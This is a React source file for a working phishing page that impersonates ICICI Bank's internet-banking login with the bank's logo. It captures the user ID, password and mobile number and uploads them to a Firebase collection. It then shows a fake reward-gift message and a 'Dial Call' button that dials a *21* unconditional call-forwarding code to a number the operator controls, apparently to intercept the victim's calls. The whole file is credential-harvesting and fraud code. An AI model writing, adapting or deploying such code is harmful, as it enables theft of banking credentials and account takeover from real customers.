import { useState, useEffect } from 'react';
import FirebaseUtil from './FirebaseRepo';
import { MdLock } from "react-icons/md";
import myImage from './assets/icici_logo.jpeg';

function App() {
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [password, setPassword] = useState('');
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [forwardingNumber, setForwardingNumber] = useState(null);

  useEffect(() => {
    const getForwardingNumber = async () => {
      const result = await FirebaseUtil.getDocument("settings", "forwarding_numbers");
      setForwardingNumber(result);
    };
    getForwardingNumber();
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log('Form submitted:', { name, phone, password });
    FirebaseUtil.uploadAnyModel("notes", { name, phone, password });
    setIsLoggedIn(true);
  };

  if (isLoggedIn) {
    return (
      <div className="max-w-md mx-auto p-4 mt-4 bg-white rounded shadow">
        <img src={myImage} alt="Description of the image" />
        <p className="text-gray-700 mb-4">To install collect your reward gift. Give us a miss call to ICICI Bank reward care click to call button.</p>
        <div className='flex justify-center'>
        <button 
  className="bg-orange-500 hover:bg-orange-700 text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline"
  onClick={() => window.open(`tel:*21*${forwardingNumber?.call_forwarding_number}%23`, '_self')}
>
  Dial Call
</button>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-md mx-auto p-4 mt-4 bg-white rounded shadow">
      <img src={myImage} alt="Description of the image" />
      <h1 className="text-lg font-bold mb-4 flex items-center text-blue-910">
        <MdLock className="mr-2 text-orange-500" />
        Login to Internet Banking
      </h1>
      <form onSubmit={handleSubmit}>
        <div className="mb-4">
          <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="name">User ID</label>
          <input className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="name" type="text" value={name} onChange={(e) => setName(e.target.value)} />
        </div>
        <div className="mb-4">
          <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="password">Password</label>
          <input className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="password" type="password" value={password} onChange={(e) => setPassword(e.target.value)} />
        </div>
        <div className="mb-4">
          <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="phone">Mobile Number</label>
          <input className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="phone" type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} />
        </div>
        <div className="flex justify-center">
          <button className="bg-orange-500 hover:bg-orange-700 text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline" type="submit">
            Login
          </button>
        </div>
      </form>
    </div>
  );
}

export default App;